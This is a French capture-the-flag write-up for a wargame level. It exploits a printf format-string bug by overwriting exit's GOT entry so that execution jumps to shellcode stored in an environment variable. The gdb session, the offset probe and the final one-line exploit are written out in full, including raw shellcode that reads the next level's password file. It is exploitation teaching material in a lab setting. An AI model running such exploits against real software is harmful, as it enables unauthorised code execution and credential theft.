# Level 05
<a href="/level06"><img align='right' width=20x height=auto src="https://cdn.onlinewebfonts.com/svg/img_68680.png"></img></a>

- Il y a une vulnerabilité dans le code source le printf a une variable en tant que format
- On commence donc par reperer l'offset
```
$> python -c "import struct; print('AAAABBBB' + '%x ' * 11)" | ./level05
aaaabbbb64 f7f39580 1 0 1 f7f99980 ffffffff 1 0 61616161 62626262
```
- Pour que notre shellcode s'execute il faut rediriger la fonction exit vers celui ci
- On recupere donc l'addresse d'exit
<pre>
$> objdump -R ./level05 

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497dc R_386_JUMP_SLOT   \__gmon_start_\_
<strong>080497e0 R_386_JUMP_SLOT   exit</strong>
080497e4 R_386_JUMP_SLOT   \__libc_start_main
</pre>
- Le retour du fgets est modifier pour nous empecher d'y ecrire un shellcode
- La meilleur solution est donc d'ecrire le shellcode dans le env
- On recupere donc l'addresse de la variable SHELLCODE
<pre>
$> env -i SHELLCODE="$SHELLCODE" SHELL=/bin/bash gdb ./level05
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) x/1s **(char***)&environ
0xffffdf77:      "SHELLCODE=jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"
(gdb) x 0xffffdf77 + 10
<strong>0xffffdf81:      "jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"</strong>
</pre>
- Apres avoir assemblé tout cela donne cette commande
```
(python -c "import struct; print('AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%57205d' + '%11\$n' + '%8318d' + '%12\$n')") | env -i SHELLCODE="$(python -c "print('\x90' * 20 + 'jsh.pashl06/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')")" SHELL=/bin/bash ./level05
```
